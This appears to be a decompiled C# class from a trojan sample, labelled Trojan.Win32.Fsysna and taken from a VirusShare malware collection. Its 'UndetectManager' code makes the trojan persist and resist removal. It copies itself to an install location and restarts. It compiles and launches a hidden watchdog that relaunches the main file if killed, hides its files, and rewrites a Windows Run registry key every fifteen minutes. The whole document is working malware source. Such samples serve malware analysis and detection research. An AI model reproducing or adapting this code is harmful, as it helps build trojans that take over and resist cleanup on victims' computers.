// Decompiled with JetBrains decompiler
// Type: Project_Unamed.UndetectManager
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Project_Unamed
{
  public class UndetectManager
  {
    private static Thread tWatcher;
    private static Thread tRegistery;

    [DebuggerNonUserCode]
    public UndetectManager()
    {
    }

    private static void ProcessChildWatcher()
    {
      string installationAntiKillFile = Settings.InstallationAntiKillFile;
      string processName = installationAntiKillFile.Substring(checked (installationAntiKillFile.LastIndexOf("\\") + 1)).Remove(installationAntiKillFile.Substring(checked (installationAntiKillFile.LastIndexOf("\\") + 1)).LastIndexOf("."));
      int num = 0;
      Thread.Sleep(2500);
      while (true)
      {
        Process[] processesByName = Process.GetProcessesByName(processName);
        int index = 0;
        while (index < processesByName.Length)
        {
          Process process = processesByName[index];
          try
          {
            if (Operators.CompareString(process.Modules[0].FileName, Settings.InstallationAntiKillFile, false) == 0)
              checked { ++num; }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        if (num == 0)
        {
          Process.Start(Settings.InstallationAntiKillFile);
          Thread.Sleep(5000);
        }
        num = 0;
        Thread.Sleep(100);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Initiliaze()
    {
      EventLogger.LogEvent("Checking installdir[" + Settings.InstallationMainFile + "]", "UDM");
      string fileName = Process.GetCurrentProcess().Modules[0].FileName;
      if (Operators.CompareString(fileName, Settings.InstallationMainFile, false) != 0)
      {
        if (File.Exists(Settings.InstallationMainFile))
          File.Delete(Settings.InstallationMainFile);
        EventLogger.LogEvent("File Installed, Restarting...", "UDM");
        File.Copy(fileName, Settings.InstallationMainFile);
        Process.Start(Settings.InstallationMainFile);
        Process.GetCurrentProcess().Kill();
      }
      try
      {
        EventLogger.LogEvent("Starting antikill", "UDM");
        string str = Settings.InstallationAntiKillFile.Substring(0, Settings.InstallationAntiKillFile.LastIndexOf("\\"));
        string installationAntiKillFile = Settings.InstallationAntiKillFile;
        bool flag = false;
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          try
          {
            if (Operators.CompareString(process.Modules[0].FileName, installationAntiKillFile, false) == 0)
            {
              flag = true;
              EventLogger.LogEvent("Antikill already started.", "UDM");
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        if (!flag)
        {
          if (!Directory.Exists(str))
            FileSystem.MkDir(str);
          if (File.Exists(installationAntiKillFile))
            File.Delete(installationAntiKillFile);
          CodeDom.GenerateExecutable(installationAntiKillFile, Sources.ProcessRestarterSource(), "");
          Process.Start(installationAntiKillFile);
          FileSystem.SetAttr(str, FileAttribute.Hidden);
          FileSystem.SetAttr(installationAntiKillFile, FileAttribute.Hidden);
        }
        UndetectManager.tWatcher = new Thread(new ThreadStart(UndetectManager.ProcessChildWatcher));
        UndetectManager.tWatcher.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        EventLogger.LogEvent("Anti-kill compiling failed. Error: " + ex.GetType().ToString(), "UDM");
        ProjectData.ClearProjectError();
      }
      EventLogger.LogEvent("Hiding files if nessecary...", "UDM");
      if (Settings.HideFiles)
        FileSystem.SetAttr(Settings.InstallationMainFile, FileAttribute.Hidden);
      EventLogger.LogEvent("Starting registery check loop...", "UDM");
      UndetectManager.tRegistery = new Thread(new ThreadStart(UndetectManager.RegistryCheckLoop));
      UndetectManager.tRegistery.Start();
      EventLogger.LogEvent("UDM Initialized", "UDM");
    }

    public static void TerminateWatcher() => UndetectManager.tWatcher.Abort();

    public static void TerminteRegisteryW() => UndetectManager.tRegistery.Abort();

    private static void RegistryCheckLoop()
    {
      while (true)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          registryKey.SetValue(Settings.RegisteryName, (object) Process.GetCurrentProcess().Modules[0].FileName);
          registryKey.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(900000);
      }
    }
  }
}
